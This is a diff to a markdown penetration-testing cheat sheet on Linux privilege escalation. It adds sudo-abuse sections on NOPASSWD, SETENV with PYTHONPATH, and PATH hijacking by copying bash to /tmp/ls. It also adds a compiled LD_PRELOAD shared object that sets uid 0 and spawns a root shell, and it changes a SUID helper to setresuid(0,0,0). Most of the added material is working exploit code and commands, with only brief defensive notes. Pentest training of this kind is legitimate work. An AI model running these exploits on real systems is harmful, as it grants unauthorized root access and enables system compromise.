@@ -40,9 +40,67 @@ rpm -qa #Centos
 
 ## Users
 
-## Writeable PATH abuses
-### euid, ruid, suid
+## GTFOBins & GTFOArgs
+[GTFOBins](https://gtfobins.github.io/)
+[GTFOArgs](https://gtfoargs.github.io/)
 
+## Sudo abuses
+List user's privileges or check a specific
+```cmd
+sudo -l
+```
+### NOPASSWD
+Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
+```cmd
+$ sudo -l
+User khoadan may run the following commands on test:
+    (root) NOPASSWD: /usr/bin/vim
+```
+### SETEVN
+This flag allows user to set environment variables when running the specified command.
+```cmd
+User khoadan may run the following commands on test:
+    (ALL) SETENV: /opt/scripts/tasks.py
+```
+**Exploit**
+PYTHONPATH is used by Python to determine which directories to look in for modules to import.
+```cmd
+sudo PYTHONPATH=/dev/mal/ /opt/scripts/tasks.py
+```
+Also use LD_PRELOAD variable
+## Sudo command without path
+When a single command such as ```ls```, ```cat``` have sudo permission. User can exploit it to get root by changing PATH.
+```cmd
+export PATH=/tmp:$PATH
+#Creat script "ls" in /tmp
+cp /bin/bash /tmp/ls
+chmod +x /tmp/ls
+sudo ls
+```
+## LD_PRELOAD & LD_LIBRARY_PATH
+LD_PRELOAD is an optional Environment Variable that is used to set/load Shared Libraries to a program or script.
+**Exploit**
+- Permission to set LD_PRELOAD Environment Variables for a program.
+- ```env_keep += LD_PRELOAD``` set in sudoers file
+Create exploit.c
+```C
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+```cmd
+gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
+sudo LD_PRELOAD=/tmp/exploit.so ls
+```
+
+### SUID
 SUID or GUID, when set, allows the process to execute under the specified user or group.
 List all binary with suid/guid:
 ```cmd
@@ -51,20 +109,21 @@ find / -perm -u=s -ls 2>/dev/null
 find / -perm -2000 -ls 2>/dev/null
 find / -perm -g=s -ls 2>/dev/null
 ```
-Using [GTFOBins](https://gtfobins.github.io/) to privesc and get a shell.
 
-Can write a SetUID binary and get a shell:
+Code: exploit.c
 ```C++
 #define _GNU_SOURCE
 #include <stdlib.h>
 #include <unistd.h>
 
 int main(void) {
-    setresuid(1000, 1000, 1000);
+    setresuid(0, 0, 0);
     system("/bin/bash");
     return 0;
 }
 ```
+
+
 ## Shared Object Hijacking
 
 ## Capabilities
@@ -130,7 +189,7 @@ usermod -s /bin/rbash {username}
 ### SELinux
 
 
-## Files and directories
+## Files and directories 
 ### Sensitive files and directories
 1. Limiting the rights
 2. Changing the secrets and access rights as soon as possible
